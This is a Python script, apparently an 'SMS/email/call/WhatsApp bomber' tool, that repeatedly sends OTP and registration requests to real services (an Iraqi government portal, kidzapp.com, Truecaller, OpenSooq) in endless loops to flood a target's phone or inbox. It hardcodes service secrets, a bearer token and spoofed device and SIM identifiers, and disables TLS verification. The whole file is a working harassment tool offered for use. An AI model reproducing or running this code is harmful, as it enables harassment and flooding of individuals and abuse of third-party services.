import os
try:
    import random
except:
    os.system('pip install random')
    import random
try:
    import requests
except:
    os.system('pip install requests')
    import requests
try:
    import time
except:
    os.system('pip install time')
    import time
try:
    import hashlib
except:
    os.system('pip install hashlib')
    import hashlib
try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent')
    import user_agent
    from user_agent import generate_user_agent
os.system('clear')
red = '\033[1;31m'
yellow = '\033[1;33m'
green = '\033[2;32m'
restart = '\x1b[0m'
import requests
requests.packages.urllib3.disable_warnings()

def sms(copyright1):
    print(copyright1)
    #os.system('clear')
    done = 0
    error = 0
    url_cookie = 'https://ur.gov.iq'
    try:
        response = requests.get(url_cookie)
    except:
        os.system('clear')
        print(copyright1)
        exit("Your WiFi Is Bad (: ")
    try:
        cookies = response.cookies.get_dict()
        cookiesession1 = cookies['cookiesession1']
        #print(cookiesession1)
    except KeyError:
        os.system('clear')
        print(copyright1)
        exit("Error | Cookie 'cookiesession1' not found")
    except Exception as e:
        os.system('clear')
        print(copyright1)
        exit(f"Error | {e}")

    url_send = "https://ur.gov.iq/api/user/sendOTP"
    headers = {
        'Accept': 'application/json, text/plain, */*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7','Connection': 'keep-alive','Content-Length': '46','Content-Type': 'application/json','Cookie': 'cookiesession1='+cookiesession1,'Host': 'ur.gov.iq','Origin': 'https://ur.gov.iq','Referer': 'https://ur.gov.iq/index/login','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': generate_user_agent(),'X-CSRF-TOKEN': 'R6B7hoBQd0wfG5Y6qOXHPNm4b9WKsTq6Vy6Jssxb'}
    code = input('Enter Code Number Phone [ ex : +964 , +963 ] : ')
    if code == "":
        os.system('clear')
        print(copyright1)
        exit("? Write Code Number")
    try:
        number = code.split('+')[1]
    except:
        os.system('clear')
        print(copyright1)
        exit('\nWrite + In Your Code Number')

    url = requests.get("https://countrycode.org/").text
    if number not in url:
        os.system('clear')
        print(copyright1)
        exit("\nError Code Number")

    phone = input("Enter Number Phone [ ex : 07xx ] : ")
    os.system('clear')
    if phone == "":
        os.system('clear')
        print(copyright1)
        exit("? Write Number Phone")

    requests_post = requests.Session()
    data = {"phone_num": phone , "phone_code": number}

    while True:
        response = requests_post.post(url_send, headers=headers, json=data, verify=False).text
        if '","data":""}' in response:
            done+=1
            time.sleep(5)
        elif 'unprocessable entity' in response:
            error+=1
            time.sleep(5)
        elif '"The given data was invalid' in response:
            os.system('clear')
            print(copyright1)
            exit(f"Error Number Phone [ {code}{phone} ]")
        else:
            error+=1
        time.sleep(3)
        os.system('clear')
        print(copyright1)
        print(f"[{done}] Message Done\n[{error}] Error Message")
def email(copyright1):
	print(copyright1)
	url_cookie = 'https://kidzapp.com/emailLogin?action=0'
	try:
		response = requests.get(url_cookie)
		time.sleep(2)
	except:
		os.system('clear')
		print(copyright1)
		exit("Your WiFi Is Bad (:")
	try:
	   cookies = response.cookies.get_dict()
	   connect_sid = cookies['connect.sid']
	   #print(connect_sid)
	except KeyError:
		os.system('clear')
		print(copyright1)
		exit("Error | Cookie 'connect.sid' not found")
	except Exception as e:
		os.system('clear')
		print(copyright1)
		print(e)
	headers = {
    'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7','content-length': '27','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'connect.sid=' + connect_sid + '; WZRK_S_R57-8Z6-8W6Z=%7B%22p%22%3A2%7D','origin': 'https://kidzapp.com','referer': 'https://kidzapp.com/emailLogin','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent() ,'x-requested-with': 'XMLHttpRequest',}
	url='https://kidzapp.com/emailLogin?action=0'
	done = 0
	error = 0
	email = input('- email : ')
	data = {'email':email}
	while True:
		r = requests.post(url,headers=headers,data=data).text
		if "b9$R" in r:
			done +=1
		else:
			error +=1
		print(copyright1)
		print(f"[{done}] Done Message\n[{error}] Error Message")
		time.sleep(1)
		os.system('clear')
def call(copyright1):
	os.system('clear')
	print(copyright1)
	target = input('Enter Target ( رقم المستهدف ) :');number = '123456789';id = str(''.join(random.choice(number) for i in range(10)));device_id = hashlib.md5(id.encode()).hexdigest()[:16];headers = {
    "Host": "account-asia-south1.truecaller.com","content-type": "application/json; charset\u003dUTF-8","content-length": "680","accept-encoding": "gzip","user-agent": "Truecaller/12.34.8 (Android;8.1.2)","clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"};url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp";data = '{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"'+device_id+'","language":"ar","manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android","osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar","sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849","mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,"minorVersion":34}},"phoneNumber":"'+target+'","region":"region-2","sequenceNo":1}'
	call = 0
	while True:
		try:
			response = requests.post(url, headers=headers, data=data).text
		except:
			print(copyright1)
			exit("Your WiFi Is Bad (:")
		if '"status":1,"message":"Sent","domain":"noneu","parsedPhoneNumber":' in response:
			call +=1
			os.system('clear')
			print(copyright1)
			print(f"Good Call ( {target} ) | Calls :{call}")
			time.sleep(5)
		elif "Invalid phone number" in response:
			os.system('clear')
			print(copyright1)
			exit(f"Invalid phone number ( {target } ) ( الرقم غير صالح )")
		elif "Phone number limit reached" in response:
			os.system('clear')
			print(copyright1)
			exit(f"Number {target} is reached ( لا يمكن الاتصال الان )")
		elif "Secret token pending" in response:
			print(copyright1)
			os.system('clear')
			print("Secret token pending الرقم مشغول حاليا/ Sleep 20 seconds")
			time.sleep(20)
			req = response = requests.post(url, headers=headers, data=data).text
			if "Secret token pending" in req:
				os.system('clear')
				print(copyright1)
				exit("Secret token pending ( الرقم مشغول حاليا يرجى الاتصال بوقت لاحق )")
			else:
				pass
		elif "Unavailable for legal reasons" in response:
			os.system('clear')
			print(copyright1)
			exit(f"Sorry Number {target} Fake & Unavailable for legal reasons \nعذرًا الرقم {target} وهمي و مخالف للقانون")
		else:
			print(copyright1)
			print(response)
def whatsapp(copyright1):
	os.system('clear')
	print(copyright1)
	ban = '''<response>
<name>Not Found</name>
<message>لم يتم العثور على الصفحة<'''
	headers = {
	 'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar','authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdDAiOjE2ODgxNDY2NjgsImF1ZCI6Im1vYmlsZSIsInN1YiI6ImJhZTY3OWFmLWM1NGItNDRmNC04NjJkLWIyNDg2NGJkMGY0OCIsInJuZCI6IjgxNTMxMTQ0MTExNzQiLCJleHAiOjE2ODgxNDc1Mjl9.hZHMKk5P_Tr9skHYBtRUdBgHCrlR1rhwn72qBWQ016s','cache-control': 'max-age=0','content-length': '83','content-type': 'application/json','country': 'iq','origin': 'https://iq.opensooq.com','referer': 'https://iq.opensooq.com/','release-version': '9.4.02','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','source': 'mobile','user-agent': generate_user_agent(),'x-tracking-uuid': 'bae679af-c54b-44f4-862d-b24864bd0f48',} 
	url = "https://api.opensooq.com/v2.1/slr/whatsapp"
	code = input('Enter Code Number Phone [ ex : +964 , +963 ] : ')
	if code == "":
		os.system('clear')
		print(copyright1)
		exit('\n'+' '*22+'^ Write Code Number ^')
	elif "+" in code:
		code = code.split('+')[1]
	try:
		url_code = requests.get("https://countrycode.org/").text
	except:
		os.system('clear')
		print(copyright1)
		exit("Your WiFi Is Bad (:")
	if code not in url_code:
		os.system('clear')
		print(copyright1)
		exit('\n'+' '*22+"Error Code Number")
	phone = input("Enter Number Phone [ ex : 07x ] : ")
	os.system('clear')
	if phone == "":
		os.system('clear')
		print(copyright1)
		exit('\n'+' '*22+'^ Write Phone Number ^')
	split1 = url_code.split(f'<td>{code}</td>')[0]
	split2 = split1.split('">')[-1]
	country_name = split2.split('</a>')[0]
	info = "Country Name : "+country_name+" "*5+"Code : "+code+" "*5+"Number : "+phone
	data = {"flow_type": "ACTION_REGISTRATION", "phone_number": phone, "country_code": code}
	done = 0
	error = 0
	while True:
		r = requests.post(url,headers=headers,json=data).text
		if ban in r:
		  print(copyright1)
		  response = requests.get("https://api.ipify.org")
		  ip_address = response.text
		  filename = ".block.txt"
		  if not os.path.isfile(filename):
		  		  open(filename, "w").close()
		  with open(filename, "r") as file:
		  		  content = file.read()
		  		  if ip_address in content:
		  		  		  exit("'This Service Was Trun OFF ✓ ','Telegram':'U_L_W'")
		  		  else:
		  		  	with open(filename, "w") as file:
		  		  		file.write(ip_address)
		  		  		exit("'This Service Was Trun OFF ✓ ','Telegram':'U_L_W'")
		elif '{"status":true,"template":"otp","' in r:
			done+=1
		elif '"title":"رقم الموبايل غير صحيح"' in r:
			os.system('clear')
			print(copyright1)
			exit('\n'+' '*22+'Error Number Phone')
		elif "يرجى إدخال رقم الموبايل" in r:
			os.system('clear')
			print(copyright1)
			exit('\n'+' '*22+'^ Write Phone Number ^')
		else:
			print(r)
			error+=1
		print(copyright1)
		print(f"[{done}] Done Message\n[{error}] Error Message"+"\n\n\n"+info)
		time.sleep(60.3)
		os.system('clear')

copyright1 = (' '*13+f"{red}'{green}GitHub{red}'{yellow}:{red}'{green}AhmedTools{red}'{yellow},{red}'{green}TeleGram{red}'{yellow}:{red}'{green}U_L_W{red}'\n{restart}")
print(copyright1)
print("1- Spam Sms [ ليس كل الدول ] [ Not All Countries ]\n2- Spam E-mail [ Gmail , Yahoo الخ ] [ { All Domins } ]\n3- Spam Call [ كل دول العالم ] [ All Countries ]\n4- Spam WhatsApp [ الوطن العربي فقط ] [ Middle East Only ]")
ch = input("~ ")
os.system('clear')
if ch == "1":
	sms(copyright1)
elif ch == "2":
	email(copyright1)
elif ch == "3":
	call(copyright1)
elif ch == "4":
	whatsapp(copyright1)
else:
	os.system('clear')
	print(copyright1)
